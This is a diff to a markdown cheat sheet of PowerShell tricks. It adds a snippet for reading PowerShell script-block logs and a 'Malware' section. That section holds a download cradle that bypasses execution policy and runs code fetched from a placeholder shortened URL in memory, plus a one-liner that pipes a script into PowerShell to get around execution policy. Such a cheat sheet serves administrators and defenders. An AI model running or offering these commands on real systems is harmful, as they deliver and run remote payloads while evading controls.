@@ -9,6 +9,12 @@ PowerShell scripts and tricks
 Get-Item -Path C:\path\* -Stream * | ?{$_.stream -notlike ":`$DATA"} | select FileName, Stream, Length
 ```
 
+## Events
+### get powershell logs
+```powershell
+Get-WinEvent "Microsoft-Windows-PowerShell/Operational" -Oldest | ? ID -eq 4104 | select TimeCreated, ID, Message | ft -wrap
+```
+
 ## It's alive!
 ```powershell
  Add-Type -AN System.Speech;[System.Speech.Synthesis.SpeechSynthesizer]::new().Speak("Kill all h
@@ -112,4 +118,14 @@ Get-Mailbox | Where {$_.ForwardingAddress -ne $null} | Set-Mailbox -ForwardingAd
 Connect-MsolService
 $User = Get-MSolUser -UserPrincipalName user@domain.com
 $User.StrongAuthenticationMethods
+```
+
+## Malware
+### start in memory from web cradle
+```powershell
+powershell.exe –ep Bypass –nop –noexit –c iex (New-Object System.Net.WebClient).DownloadString(“https://bit.ly/M@1w@r3”)
+```
+### start from file and avoid execution bypass policy
+```powershell
+gc .\test.ps1 | powershell -
 ```
